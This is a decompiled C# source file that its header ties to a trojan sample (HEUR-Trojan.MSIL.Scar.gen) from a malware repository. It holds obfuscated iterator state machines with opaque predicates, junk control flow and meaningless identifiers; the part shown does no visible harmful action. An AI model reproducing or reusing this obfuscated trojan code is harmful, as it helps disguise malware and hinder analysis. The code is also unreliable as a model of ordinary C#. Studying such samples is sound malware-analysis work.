// Decompiled with JetBrains decompiler
// Type: ConsoleApp13.Structs.IssuerStatusStructBuilder
// Assembly: ConsoleApp13, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B655A79A-67BF-4D11-3C9F-30AAF7B05A65
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Scar.gen-9cde0d9eb4a1bd5801ecea6dca2b0883ce6136a99ec76c4e9dbcbbf06f186f49.exe

using Arrznfhcz.Adapter;
using Arrznfhcz.Configurations;
using Arrznfhcz.Exceptions;
using Arrznfhcz.Expressions;
using ConsoleApp13.Managers;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace ConsoleApp13.Structs
{
  internal static class IssuerStatusStructBuilder
  {
    internal sealed class Observer : 
      InfoParameterManager<int>,
      ClassAccountException<int>,
      Predicate,
      IndexerErrorExpression,
      SpecificationPoolAdapter
    {
      private int _State;
      private int m_Map;
      private int _Parser;
      private int m_Pool;
      public int account;
      private int m_Creator;
      private int _Error;
      private ClassAccountException<int> m_Model;
      private int value;
      internal static IssuerStatusStructBuilder.Observer InstantiateClass;

      [DebuggerHidden]
      public Observer(int column_last)
      {
        this._State = column_last;
        int num1 = 0;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_1557e7f9a28744318187cac672b3e64a != 0)
          goto label_3;
label_1:
        switch (num1)
        {
          default:
            this._Parser = ((Thread) IssuerStatusStructBuilder.Observer.InsertClass()).ManagedThreadId;
            return;
        }
label_3:
        int num2;
        num1 = num2;
        goto label_1;
      }

      [DebuggerHidden]
      void IndexerErrorExpression.SelectObserver()
      {
        int num1 = 2;
label_1:
        int num2 = num1;
        int state;
        while (true)
        {
          switch (num2)
          {
            case 1:
              if (state != -3)
              {
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_7dea2bd0329b4448bbfb2d5aafa61955 == 0)
                {
                  num2 = 0;
                  continue;
                }
                goto label_1;
              }
              else
                goto label_7;
            case 2:
              state = this._State;
              num2 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_e749e26f727a446ca597537953d7d4ed == 0 ? 1 : 1;
              continue;
            default:
              goto label_10;
          }
        }
label_7:
        try
        {
        }
        finally
        {
          this.InvokeObserver();
        }
        return;
label_10:
        if (state == 1)
          goto label_7;
      }

      bool SpecificationPoolAdapter.\u0006\u2004\u200A\u0002()
      {
        bool flag;
        // ISSUE: fault handler
        try
        {
          int state = this._State;
          if (state != 0)
            goto label_12;
          else
            goto label_20;
label_2:
          int num1;
          int num2 = num1;
label_3:
          while (true)
          {
            int pool;
            int error;
            switch (num2)
            {
              case 1:
              case 9:
                if (!this.m_Model.\u0006\u2004\u200A\u0002())
                {
                  num2 = 4;
                  continue;
                }
                goto label_24;
              case 2:
                goto label_19;
              case 3:
                pool = this.m_Pool;
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_376cd90bc67442b2a023c2fa5704acea != 0)
                {
                  num2 = 12;
                  continue;
                }
                goto label_2;
              case 4:
                this.InvokeObserver();
                num2 = 7;
                continue;
              case 5:
                goto label_24;
              case 6:
                goto label_11;
              case 7:
                this.m_Model = (ClassAccountException<int>) null;
                flag = false;
                num2 = 10;
                continue;
              case 8:
                this.m_Model = ((InfoParameterManager<int>) new IssuerStatusStructBuilder.DescriptorTestContainer(-2)).ViewObserver();
                this._State = -3;
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_8b8077f557054a4ab05eaafebde5d335 == 0)
                {
                  num2 = 1;
                  continue;
                }
                goto label_2;
              case 10:
                goto label_27;
              case 11:
              case 13:
                goto label_4;
              case 12:
                this.m_Pool = pool - 1;
                if (this.m_Pool == 0)
                {
                  num2 = 2;
                  continue;
                }
                break;
              case 14:
                goto label_12;
              case 15:
                this.m_Creator = 0;
                num2 = 17;
                continue;
              case 16:
                this._Error = error + this.m_Creator + this.m_Pool ^ 1055116254 + this.value;
                this.m_Creator = error;
                num2 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_0dd863ab6ed14241aa15ed1dfcc266fd != 0 ? 9 : 4;
                continue;
              case 17:
                this._Error = 1;
                num2 = 8;
                continue;
            }
            error = this._Error;
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_c01d8930102341939fcf775d628a6ec2 != 0)
              num2 = 16;
            else
              goto label_2;
          }
label_4:
          this._State = -1;
          num1 = 15;
          goto label_2;
label_11:
          this.InvokeObserver();
          goto label_27;
label_19:
          flag = false;
          goto label_11;
label_24:
          this.value = this.m_Model.\u0006\u2004\u200A\u0002();
          this.m_Map = this._Error;
          this._State = 1;
          flag = true;
          goto label_27;
label_12:
          if (state != 1)
          {
            flag = false;
            goto label_27;
          }
          else
          {
            this._State = -3;
            num2 = 3;
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_505055cbf4f4456c89c930d0e73a9496 == 0)
              goto label_3;
            else
              goto label_2;
          }
label_20:
          num2 = 11;
          goto label_3;
        }
        __fault
        {
          this.SelectObserver();
        }
label_27:
        return flag;
      }

      private void InvokeObserver()
      {
        int num1 = 1;
label_1:
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
              this._State = -1;
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_5609a52ca07947cf84535ca32afd24cf == 0)
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        if (this.m_Model == null)
          return;
        this.m_Model.PublishObserver();
      }

      [DebuggerHidden]
      int ClassAccountException<int>.SelectObserver() => this.m_Map;

      [DebuggerHidden]
      void SpecificationPoolAdapter.PopObserver() => throw new NotSupportedException();

      [DebuggerHidden]
      object SpecificationPoolAdapter.SelectObserver() => (object) this.m_Map;

      [DebuggerHidden]
      ClassAccountException<int> InfoParameterManager<int>.SelectObserver()
      {
        IssuerStatusStructBuilder.Observer observer;
        if (this._State == -2 && this._Parser == Thread.CurrentThread.ManagedThreadId)
        {
          this._State = 0;
          observer = this;
        }
        else
          observer = new IssuerStatusStructBuilder.Observer(0);
        observer.m_Pool = this.account;
        return (ClassAccountException<int>) observer;
      }

      [DebuggerHidden]
      SpecificationPoolAdapter Predicate.SelectObserver() => (SpecificationPoolAdapter) this.SelectObserver();

      internal static object InsertClass() => (object) Thread.CurrentThread;

      internal static bool QueryClass() => IssuerStatusStructBuilder.Observer.InstantiateClass == null;

      internal static IssuerStatusStructBuilder.Observer PatchClass() => IssuerStatusStructBuilder.Observer.InstantiateClass;
    }

    internal sealed class DescriptorTestContainer : 
      InfoParameterManager<int>,
      ClassAccountException<int>,
      Predicate,
      IndexerErrorExpression,
      SpecificationPoolAdapter
    {
      private int _Status;
      private int m_Parameter;
      private int schema;
      private int test;
      private static IssuerStatusStructBuilder.DescriptorTestContainer VerifyClass;

      [DebuggerHidden]
      public DescriptorTestContainer(int task_low)
      {
        this._Status = task_low;
        this.schema = IssuerStatusStructBuilder.DescriptorTestContainer.PublishClass((object) Thread.CurrentThread);
        int num1 = 0;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_d36453644a4143ccb40d965bf52fd815 == 0)
          goto label_3;
label_1:
        switch (num1)
        {
          case 0:
            return;
          default:
            return;
        }
label_3:
        int num2;
        num1 = num2;
        goto label_1;
      }

      [DebuggerHidden]
      void IndexerErrorExpression.ResolveObserver()
      {
      }

      bool SpecificationPoolAdapter.\u0006\u2004\u200A\u0002()
      {
        int status = this._Status;
        if (status != 0)
          goto label_8;
        else
          goto label_13;
label_1:
        int num1;
        int num2 = num1;
label_2:
        while (true)
        {
          switch (num2)
          {
            case 1:
              this.test += this.test;
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_d10e5279890341ec844a826edfc91e91 != 0)
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            case 2:
              goto label_12;
            case 3:
              this.test = 1;
              break;
            case 4:
              goto label_11;
            case 5:
              goto label_8;
            default:
              if (this.test == 64)
              {
                this.test = 5;
                break;
              }
              break;
          }
          this.m_Parameter = this.test;
          if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_30a1a84750d84e30a7cdd3e1e1aaa885 == 0)
            num2 = 4;
          else
            goto label_1;
        }
label_11:
        this._Status = 1;
        return true;
label_12:
        return false;
label_8:
        if (status == 1)
        {
          this._Status = -1;
          num2 = 1;
          if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_5873c61e3e144ce280377d53bf96bf5b != 0)
            goto label_2;
          else
            goto label_1;
        }
        else
        {
          num2 = 2;
          goto label_2;
        }
label_13:
        this._Status = -1;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_08f961ec28b14a0d93c86d0141b3afb2 != 0)
        {
          num2 = 3;
          goto label_2;
        }
        else
          goto label_1;
      }

      [DebuggerHidden]
      int ClassAccountException<int>.ResolveObserver() => this.m_Parameter;

      [DebuggerHidden]
      void SpecificationPoolAdapter.ReadObserver() => throw new NotSupportedException();

      [DebuggerHidden]
      object SpecificationPoolAdapter.ResolveObserver() => (object) this.m_Parameter;

      [DebuggerHidden]
      ClassAccountException<int> InfoParameterManager<int>.ResolveObserver()
      {
        IssuerStatusStructBuilder.DescriptorTestContainer descriptorTestContainer;
        if (this._Status == -2 && this.schema == Thread.CurrentThread.ManagedThreadId)
        {
          this._Status = 0;
          descriptorTestContainer = this;
        }
        else
          descriptorTestContainer = new IssuerStatusStructBuilder.DescriptorTestContainer(0);
        return (ClassAccountException<int>) descriptorTestContainer;
      }

      [DebuggerHidden]
      SpecificationPoolAdapter Predicate.ResolveObserver() => (SpecificationPoolAdapter) this.ResolveObserver();

      internal static int PublishClass([In] object obj0) => ((Thread) obj0).ManagedThreadId;

      internal static bool GetClass() => IssuerStatusStructBuilder.DescriptorTestContainer.VerifyClass == null;

      internal static IssuerStatusStructBuilder.DescriptorTestContainer RateClass() => IssuerStatusStructBuilder.DescriptorTestContainer.VerifyClass;
    }

    internal sealed class PrinterParserPool : 
      InfoParameterManager<int>,
      ClassAccountException<int>,
      Predicate,
      IndexerErrorExpression,
      SpecificationPoolAdapter
    {
      private int container;
      private int m_Composer;
      private int algo;
      private int _Rules;
      public int initializer;
      private int interceptor;
      private ClassAccountException<int> m_Object;
      internal static IssuerStatusStructBuilder.PrinterParserPool ListClass;

      [DebuggerHidden]
      public PrinterParserPool(int firstend)
      {
        this.container = firstend;
        this.algo = Thread.CurrentThread.ManagedThreadId;
        int num1 = 0;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_300d51abc2d74aaf9f7d70a870132ede == 0)
          goto label_3;
label_1:
        switch (num1)
        {
          case 0:
            return;
          default:
            return;
        }
label_3:
        int num2;
        num1 = num2;
        goto label_1;
      }

      [DebuggerHidden]
      void IndexerErrorExpression.CollectObserver()
      {
        int num = 1;
        int container;
        while (true)
        {
          switch (num)
          {
            case 1:
              container = this.container;
              num = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_aa6040258dd646c192d37f2ff98d8dff == 0 ? 0 : 0;
              continue;
            case 2:
              goto label_6;
            default:
              switch (container)
              {
                case -3:
                  goto label_6;
                case 1:
                  num = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_566d922ed9d14ab0bbc0075157c0261c != 0 ? 2 : 1;
                  continue;
                default:
                  goto label_3;
              }
          }
        }
label_3:
        return;
label_6:
        try
        {
        }
        finally
        {
          this.ValidateObserver();
        }
      }

      bool SpecificationPoolAdapter.\u0006\u2004\u200A\u0002()
      {
        bool flag;
        // ISSUE: fault handler
        try
        {
          int container = this.container;
          int num1 = 15;
          while (true)
          {
            int num2;
            int num3;
            switch (num1)
            {
              case 1:
                this.m_Object = (ClassAccountException<int>) null;
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_a14a1ce129054704abcf1a975c0f7335 != 0)
                {
                  num1 = 0;
                  continue;
                }
                break;
              case 2:
                if ((num3 & 3) == 0)
                {
                  num1 = 13;
                  continue;
                }
                goto case 12;
              case 3:
                this.interceptor = 7;
                int rules = this._Rules;
                this.m_Object = ((InfoParameterManager<int>) new IssuerStatusStructBuilder.Observer(-2)
                {
                  account = rules
                }).ViewObserver();
                this.container = -3;
                num1 = 10;
                continue;
              case 4:
                if ((num3 & 15) == 0)
                {
                  num3 ^= -642317803;
                  num2 = 14;
                  break;
                }
                goto case 14;
              case 5:
                goto label_6;
              case 6:
                goto label_27;
              case 7:
                num3 = this.m_Object.\u0006\u2004\u200A\u0002() ^ this._Rules;
                num1 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_bfeaec5e9ddc45638b70eaaae0e0b845 != 0 ? 1 : 2;
                continue;
              case 8:
                if (container != 1)
                {
                  num1 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_2985022a035a42c6bd2258b66c6b40c6 != 0 ? 1 : 6;
                  continue;
                }
                this.container = -3;
                num1 = 16;
                continue;
              case 9:
                goto label_8;
              case 10:
                if (!this.m_Object.\u0006\u2004\u200A\u0002())
                {
                  this.ValidateObserver();
                  goto case 1;
                }
                else
                  goto case 7;
              case 11:
                goto label_31;
              case 12:
                --this.interceptor;
                num1 = 4;
                continue;
              case 13:
                num3 ^= 824826941;
                num1 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_e0094ea1919248959e37e63a8e673ea5 != 0 ? 11 : 12;
                continue;
              case 14:
                this.m_Composer = num3;
                this.container = 1;
                num1 = 9;
                continue;
              case 15:
                if (container != 0)
                {
                  num1 = 8;
                  continue;
                }
                this.container = -1;
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_bfeaec5e9ddc45638b70eaaae0e0b845 == 0)
                {
                  num1 = 3;
                  continue;
                }
                break;
              case 16:
                if (this.interceptor == 0)
                {
                  num1 = 5;
                  continue;
                }
                goto case 10;
              default:
                flag = false;
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_300d51abc2d74aaf9f7d70a870132ede != 0)
                {
                  num1 = 11;
                  continue;
                }
                break;
            }
            num1 = num2;
          }
label_6:
          flag = false;
          this.ValidateObserver();
          goto label_31;
label_8:
          flag = true;
          goto label_31;
label_27:
          flag = false;
        }
        __fault
        {
          this.CollectObserver();
        }
label_31:
        return flag;
      }

      private void ValidateObserver()
      {
        this.container = -1;
        if (this.m_Object == null)
          return;
label_4:
        this.m_Object.PublishObserver();
        int num1 = 1;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_4d96845969c54a4f8f3e52915e7ef9b3 == 0)
          goto label_5;
label_1:
        switch (num1)
        {
          case 1:
            return;
          default:
            goto label_4;
        }
label_5:
        int num2;
        num1 = num2;
        goto label_1;
      }

      [DebuggerHidden]
      int ClassAccountException<int>.CollectObserver() => this.m_Composer;

      [DebuggerHidden]
      void SpecificationPoolAdapter.CancelObserver() => throw new NotSupportedException();

      [DebuggerHidden]
      object SpecificationPoolAdapter.CollectObserver() => (object) this.m_Composer;

      [DebuggerHidden]
      ClassAccountException<int> InfoParameterManager<int>.CollectObserver()
      {
        IssuerStatusStructBuilder.PrinterParserPool printerParserPool;
        if (this.container == -2 && this.algo == Thread.CurrentThread.ManagedThreadId)
        {
          this.container = 0;
          printerParserPool = this;
        }
        else
          printerParserPool = new IssuerStatusStructBuilder.PrinterParserPool(0);
        printerParserPool._Rules = this.initializer;
        return (ClassAccountException<int>) printerParserPool;
      }

      [DebuggerHidden]
      SpecificationPoolAdapter Predicate.CollectObserver() => (SpecificationPoolAdapter) this.CollectObserver();

      internal static bool FillClass() => IssuerStatusStructBuilder.PrinterParserPool.ListClass == null;

      internal static IssuerStatusStructBuilder.PrinterParserPool CreateClass() => IssuerStatusStructBuilder.PrinterParserPool.ListClass;
    }
  }
}
